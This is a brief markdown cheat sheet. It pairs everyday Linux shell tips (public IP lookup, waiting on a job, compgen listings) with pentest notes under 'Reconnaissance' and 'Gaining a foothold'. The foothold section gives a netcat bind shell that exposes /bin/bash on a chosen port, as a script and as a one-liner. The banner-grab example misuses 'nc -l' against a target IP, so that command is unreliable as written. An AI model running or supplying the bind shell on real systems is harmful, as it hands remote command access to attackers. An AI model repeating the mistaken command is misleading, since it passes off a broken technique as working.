# Linux  

## Check My IP `curl https://checkip.amazonaws.com`  

## Wait for a job/command to finish  
Will print PID and wait for the last PID in the queue
```
sleep 60 &
PID_number_of_last_command=$!
wait ${PID_number_of_last_command}

```

```sh
compgen -c # Will list all the commands you could run.
compgen -a # Will list all the aliases you could run.
compgen -b # Will list all the built-ins you could run.
compgen -k # Will list all the keywords you could run.
compgen -A function # Will list all the functions you could run.
```

# Reconnaissance  
## Netcat is not Ncat
Fun not-a-fact: Ncat comes from Nmap according to a post on a forum.
- Banner
```sh
# Print the banner of a webserver
nc -l $target_ip 80
```  
and then as a payload
```http
HEAD / HTTP/1.0
```

# Gaining a foothold
## Spawn a shell
```sh
port_number=$1
nc -l -p $port_number -e /bin/bash
```  
Spawn a shell: `nc -l -p 443 -e /bin/bash`  